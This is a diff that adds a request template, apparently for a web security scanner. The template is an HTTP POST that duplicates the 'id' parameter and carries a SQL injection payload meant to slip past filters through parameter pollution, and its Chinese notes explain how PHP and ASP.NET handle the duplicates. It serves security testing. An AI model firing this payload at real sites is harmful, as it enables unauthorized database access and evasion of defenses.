@@ -1,0 +1,15 @@
+# @name: HTTP参数污染(HPP-POST Body)
+# @tags: post,sqli,hpp,php,aspnet,id,bypass
+# @color: cyan
+# @validate: baseline_similarity
+# @threshold: 0.92
+# @intent: hpp_post_body
+# @intent.param: id
+# @intent.payload: id=1&id=1' and 'a'='a
+# @note: 在 POST 表单 Body 中重复提交 id 参数(HTTP 参数污染)，不同后端取首/末/拼接值，分裂关键字使单值看似无害(PHP 拼接、ASP.NET 取末值)。
+POST / HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+Content-Type: application/x-www-form-urlencoded
+
+id=1&id=1'+and+'a'='a
